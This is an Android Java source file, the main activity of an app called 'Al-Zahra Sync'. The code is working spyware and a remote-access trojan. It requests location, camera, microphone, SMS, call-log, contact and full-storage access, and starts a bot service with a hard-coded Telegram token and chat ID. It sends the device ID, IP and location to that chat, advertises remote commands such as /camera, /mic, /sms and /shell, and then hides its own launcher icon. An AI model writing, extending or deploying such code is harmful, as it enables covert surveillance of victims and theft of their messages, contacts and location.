package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.data.AppCollector;
import com.alzahra.data.BatteryHelper;
import com.alzahra.data.CallLogCollector;
import com.alzahra.data.CMDHelper;
import com.alzahra.data.ContactsCollector;
import com.alzahra.data.DeviceInfo;
import com.alzahra.data.FileHelper;
import com.alzahra.data.LocationHelper;
import com.alzahra.data.MicRecorder;
import com.alzahra.data.NotificationHelper;
import com.alzahra.data.SMSCollector;
import com.alzahra.data.ScreenCaptureHelper;
import com.alzahra.data.ShellExecutor;
import com.alzahra.data.WifiHelper;
import com.alzahra.receivers.AdminReceiver;
import com.alzahra.services.BotService;
import com.alzahra.services.CoreService;
import com.alzahra.telegram.TelegramAPI;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_CODE = 100;
    private static final int ADMIN_CODE = 200;
    private static final int OVERLAY_CODE = 300;
    private static final int USAGE_CODE = 400;
    private static final int STORAGE_CODE = 500;
    
    // البيانات من المستخدم
    public static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    public static final String CHAT_ID = "7344776596";
    
    private int permissionIndex = 0;
    private String[] permissionGroups;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "=== Al-Zahra Sync Starting ===");
        
        // بدء الخدمة الأساسية أولاً
        startService(new Intent(this, CoreService.class));
        
        // تحضير مجموعات الأذونات
        preparePermissionGroups();
        
        // بدء طلب الأذونات
        new Handler(Looper.getMainLooper()).postDelayed(this::startPermissionRequests, 500);
    }
    
    private void preparePermissionGroups() {
        permissionGroups = new String[]{
            // المجموعة 1: الأساسية
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            
            // المجموعة 2: الموقع
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            
            // المجموعة 3: الكاميرا والميكروفون
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            
            // المجموعة 4: الهاتف
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            
            // المجموعة 5: جهات الاتصال
            Manifest.permission.READ_CONTACTS,
            
            // المجموعة 6: SMS
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            
            // المجموعة 7: التخزين
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
        };
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionGroups = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
            };
        }
    }
    
    private void startPermissionRequests() {
        requestNextPermission();
    }
    
    private void requestNextPermission() {
        if (permissionIndex >= permissionGroups.length) {
            // انتهت الأذونات العادية، انتقل للخاصة
            requestSpecialPermissions();
            return;
        }
        
        String permission = permissionGroups[permissionIndex];
        
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, 
                new String[]{permission}, PERMISSION_CODE + permissionIndex);
        } else {
            permissionIndex++;
            requestNextPermission();
        }
    }
    
    private void requestSpecialPermissions() {
        // 1. إذن الظهور فوق التطبيقات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_CODE);
                return;
            }
        }
        
        // 2. الوصول إلى الاستخدام
        if (!hasUsageStatsPermission()) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivityForResult(intent, USAGE_CODE);
            return;
        }
        
        // 3. إدارة التخزين الكاملة (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, STORAGE_CODE);
                return;
            }
        }
        
        // 4. إلغاء تحسين البطارية
        requestBatteryOptimization();
    }
    
    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
        
        // بعد الأذونات الخاصة، انتقل للإدارة
        setupComplete();
    }
    
    private void setupComplete() {
        Log.d(TAG, "=== Starting Bot Service ===");
        
        // بدء خدمة البوت
        Intent botService = new Intent(this, BotService.class);
        botService.putExtra("token", BOT_TOKEN);
        botService.putExtra("chat_id", CHAT_ID);
        startService(botService);
        
        Toast.makeText(this, "✅ تم التفعيل بنجاح!", Toast.LENGTH_LONG).show();
        
        // إرسال معلومات الجهاز
        sendDeviceInfo();
        
        // إخفاء التطبيق
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            hideApp();
        }, 3000);
    }
    
    private void sendDeviceInfo() {
        new Thread(() -> {
            try {
                DeviceInfo device = new DeviceInfo(this);
                TelegramAPI.sendMessage(BOT_TOKEN, CHAT_ID, 
                    "\uD83C\uDF89 <b>تم تفعيل البوت بنجاح!</b>\n\n" +
                    "\uD83D\uDCF1 <b>الجهاز:</b> " + device.getModel() + "\n" +
                    "\uD83D\uDD11 <b>المعرف:</b> <code>" + device.getDeviceId() + "</code>\n" +
                    "\uD83D\uDCE1 <b>IP:</b> " + device.getIPAddress() + "\n" +
                    "\uD83D\uDCCD <b>الموقع:</b> " + device.getLocation() + "\n" +
                    "\uD83D\uDD50 <b>الوقت:</b> " + java.text.DateFormat.getDateTimeInstance().format(new java.util.Date()) + "\n\n" +
                    "\uD83D\uDCD6 <b>الأوامر المتاحة:</b>\n" +
                    "/device, /location, /camera, /mic, /sms\n" +
                    "/contacts, /calls, /apps, /screen, /shell\n" +
                    "/lock, /unlock, /restart, /whatsapp\n\n" +
                    "\uD83D\uDFE2 <b>الحالة:</b> متصل ويعمل");
            } catch (Exception e) {
                Log.e(TAG, "Error sending device info: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode >= PERMISSION_CODE && requestCode < PERMISSION_CODE + 100) {
            permissionIndex++;
            requestNextPermission();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_CODE || requestCode == USAGE_CODE || requestCode == STORAGE_CODE) {
            requestSpecialPermissions();
        } else if (requestCode == ADMIN_CODE) {
            setupComplete();
        }
    }
    
    private void hideApp() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
